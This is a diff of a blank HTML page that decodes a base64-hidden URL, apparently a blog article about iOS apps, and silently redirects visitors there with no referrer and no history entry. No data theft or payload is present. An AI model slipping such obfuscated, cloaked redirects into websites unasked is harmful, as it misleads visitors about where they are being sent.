@@ -2,16 +2,23 @@
 <html lang="vi">
 <head>
   <meta charset="utf-8" />
-  <title></title>
   <meta name="referrer" content="no-referrer" />
-  <style>
-    html, body { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; }
-  </style>
-  <script>
-    const b64 = "aHR0cHM6Ly93d3cuYXBwc3RhY2suYmxvZy9hcHAvbWVudS1hcHAtaW9zLWRldmVsb3BtZW50LWFwcGxlLWJsYWNrbGlzdGVkLw==";
-    const url = atob(b64);
-    location.replace(url);
-  </script>
+  <title></title>
+  <style>html,body{margin:0;height:100%;background:#fff}</style>
 </head>
-<body></body>
+<body>
+<script>
+  (function () {
+    var b64 = "aHR0cHM6Ly93d3cuYXBwc3RhY2suYmxvZy9hcHAvbWVudS1hcHAtaW9zLWRldmVsb3BtZW50LWFwcGxlLWJsYWNrbGlzdGVkLw==";
+    try {
+      var url = atob(b64.replace(/\s+/g, ""));
+      if (!/^https?:\/\//i.test(url)) return;
+      // dùng replace để không có history entry
+      window.location.replace(url);
+    } catch (e) {
+      // nếu atob fail thì đứng im
+    }
+  })();
+</script>
+</body>
 </html>
